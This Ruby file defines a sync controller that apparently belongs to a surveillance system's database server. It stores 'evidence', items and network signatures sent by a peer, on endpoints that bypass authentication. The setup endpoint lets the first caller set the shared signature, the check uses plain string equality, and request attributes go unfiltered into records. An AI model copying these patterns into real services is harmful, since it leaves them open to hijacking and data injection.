require_relative '../rest'
require_relative '../db_objects/signature'
require_relative '../db_objects/status'

module RCS
  module DB
    class SyncController < RESTController

      bypass_auth [:evidence, :items, :status, :setup]
      require_license :evidence, :items, :status, :setup, license: :archive

      NEED_SIGNATURES = 2
      NEED_ITEMS = 4

      def evidence
        return not_authorized(msg: 'Invalid signature') unless valid_signature?

        evidence_attributes = @params['evidence']
        evidence_path = @params['path']

        if evidence_attributes.blank? or evidence_path.blank?
          return bad_request(msg: 'Invalid parameters')
        end

        if need_items?(evidence_path)
          ok(msg: 'Need items', code: NEED_ITEMS, operation_id: evidence_path.first)
        else
          trace :info, "Storing evidence #{evidence_attributes['_id']}"
          result = store_evidence(evidence_path[1], evidence_attributes)
          ok(msg: (result ? "Stored" : "Nothing was changed"))
        end
      end

      def items
        return not_authorized(msg: 'Invalid signature') unless valid_signature?

        items = @params['items']

        return bad_request(msg: 'Invalid parameters') if items.blank?

        store_items(items)

        ok(msg: "Stored")
      end

      def status
        unless has_signatures?
          return server_error(msg: 'Need signatures', code: NEED_SIGNATURES)
        end

        return not_authorized(msg: 'Invalid signature') unless valid_signature?

        status = ::Status.where(type: 'db').first
        if status
          ok(status: status)
        else
          server_error(msg: 'Status not computed yet')
        end
      end


      def setup
        signatures = @params['signatures']

        return bad_request(msg: 'Expected signatures') if signatures.blank?

        if has_signatures?
          if valid_signature?
            ok(msg: 'Nothing was changed')
          else
            server_error(msg: 'Signature was alredy written and cannot be changed with a different one')
          end
        else
          store_signatures(signatures)
          ok(msg: "Stored")
        end
      end

      private

      def valid_signature?
        received = @request[:headers][:x_sync_signature]
        expected = Signature.where(scope: 'network').first.try(:value)
        !received.blank? and received == expected
      end

      def has_signatures?
        Signature.all.count > 0
      end

      def store_evidence(target_id, attributes)
        collection = Evidence.collection_class(target_id)
        return unless collection.where(id: attributes["_id"]).count.zero?
        evi = collection.new(attributes)
        evi._id = attributes["_id"]
        evi.save!
        # TODO: send the evidence to #save_evidence
      end

      def store_items(items)
        items.each do |attributes|
          next unless ::Item.where(id: attributes["_id"]).count.zero?
          item = ::Item.new(attributes)
          item._id = attributes['_id']
          item.save!
        end
      end

      def need_items?(path)
        ::Item.any_in(id: path).count != path.size
      end

      def store_signatures(signatures)
        signatures.each do |attributes|
          doc = Signature.new(attributes)
          doc._id = attributes["_id"]
          doc.save!
        end
      end
    end
  end
end
